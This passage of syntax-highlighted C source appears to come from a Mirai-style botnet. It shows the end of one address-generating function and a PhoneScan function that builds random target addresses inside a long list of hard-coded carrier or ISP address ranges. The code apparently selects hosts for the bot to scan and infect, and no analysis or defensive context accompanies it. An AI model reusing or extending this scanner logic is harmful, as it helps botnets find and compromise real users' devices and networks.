class="keyword">if</span>(randnum == <span class="number">28</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;90.94.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">29</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;92.191.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">30</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;95.16.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">31</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;95.17.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">32</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;95.18.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">33</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;95.19.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">34</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;95.20.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">35</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;95.21.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">36</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;95.22.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">37</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;95.23.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> inet_addr(ip);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">in_addr_t</span> <span class="title">PhoneScan</span><span class="params">()</span></span>&#123;</span><br><span class="line">ipState[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">ipState[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">ipState[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">ipState[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">ipState[<span class="number">0</span>] = rand() % <span class="number">255</span>;</span><br><span class="line">ipState[<span class="number">1</span>] = rand() % <span class="number">255</span>;</span><br><span class="line">ipState[<span class="number">2</span>] = rand() % <span class="number">255</span>;</span><br><span class="line">ipState[<span class="number">3</span>] = rand() % <span class="number">255</span>;</span><br><span class="line"><span class="keyword">int</span> randnum = rand() % <span class="number">117</span>;</span><br><span class="line"><span class="keyword">char</span> ip[<span class="number">16</span>];</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;119.157.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;119.150.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;119.151.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;119.152.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;119.153.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;119.154.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">6</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;119.155.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">7</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;119.156.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;119.157.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">9</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;119.158.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;119.159.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">11</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;191.24.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">12</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;187.119.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">13</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;177.215.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">14</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;152.241.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">15</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;182.185.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">16</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.80.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">17</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.81.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">18</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.82.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">19</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.83.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">20</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.84.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">21</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.86.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">22</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.87.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">23</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.88.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">24</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.89.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">25</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.90.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">26</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.91.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">27</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.92.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">28</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.93.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">29</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.94.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">30</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.95.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">31</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.96.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">32</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.97.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">33</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.98.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">34</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.99.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">35</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;152.240.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">36</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;152.241.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">37</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;152.242.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">38</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;152.243.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">39</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;152.244.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">40</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;152.245.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">41</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;152.246.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">42</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;152.247.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">43</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;152.248.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">44</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;152.249.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">45</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;182.189.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">46</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;182.190.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">47</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;182.191.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">48</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;182.188.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">49</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;182.187.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">50</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;182.186.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">51</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;182.185.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">52</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;182.184.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">53</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.100.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">54</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.101.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">55</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.102.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">56</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.103.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">57</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.110.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">58</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.111.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">59</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.112.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">60</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.113.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">61</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.114.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">62</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.115.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">63</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.116.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">64</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.117.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">65</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;191.193.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">66</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;191.194.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">67</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;191.195.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">68</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;191.196.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">69</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;191.197.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">70</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;191.198.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">71</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;152.250.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">72</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;152.251.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">73</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;152.252.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">74</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;152.253.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">75</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;152.254.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">76</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;152.255.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">77</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;177.112.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">78</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;177.113.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">79</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;177.114.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">80</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;177.115.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">81</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;177.116.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">82</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;177.117.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">83</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;177.118.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">84</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;177.119.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">85</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;177.120.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">86</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;177.121.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">87</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;177.138.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">88</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;177.139.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">89</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;177.144.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">90</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;177.145.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">91</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;177.146.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span 